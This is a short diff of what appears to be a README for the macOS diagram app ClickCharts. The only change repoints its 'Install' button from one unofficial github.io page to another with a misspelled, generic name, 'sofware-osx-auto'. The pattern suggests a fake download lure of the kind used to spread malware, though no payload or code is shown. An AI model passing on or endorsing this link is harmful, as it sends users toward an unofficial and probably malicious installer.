@@ -6,7 +6,7 @@
 <h3>ClickCharts - process visualization tool</h3>
 <p>ClickCharts is a professional flowchart and diagram software application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/)
 </div>
 <br/><br>
 
